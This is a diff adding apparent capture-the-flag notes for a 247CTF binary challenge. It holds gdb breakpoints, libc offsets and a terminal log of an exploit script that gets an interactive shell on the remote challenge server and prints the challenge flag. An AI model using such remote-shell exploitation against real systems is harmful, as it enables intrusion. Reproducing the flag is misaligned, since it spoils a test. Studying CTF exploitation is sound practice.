@@ -1,0 +1,31 @@
+br *0x080487e2
+set follow-fork-mode child
+
+
+br *0x08048836    -> send wrong
+br *0x0804880d    -> send right
+
+
+
+strlen : 900
+write : 6f0
+socket : bb0
+
+
+[letscode](14:29:25)-> python3 file2.py 
+/usr/lib/python3/dist-packages/requests/__init__.py:89: RequestsDependencyWarning: urllib3 (1.26.6) or chardet (3.0.4) doesn't match a supported version!
+  warnings.warn("urllib3 ({}) or chardet ({}) doesn't match a supported "
+[+] Opening connection to 144.76.74.118 on port 50198: Done
+b'Enter the secret password!'
+0xf7d50000
+[*] Switching to interactive mode
+$ ls
+chall
+flag_8c1147c6aab78707.txt
+$ cat flag_8c1147c6aab78707.txt
+247CTF{8c1147c6aab7870757ad3d7498f39d8b}
+$ 
+$ 
+[*] Interrupted
+[*] Closed connection to 144.76.74.118 port 50198
+[letscode](14:31:38)-> 
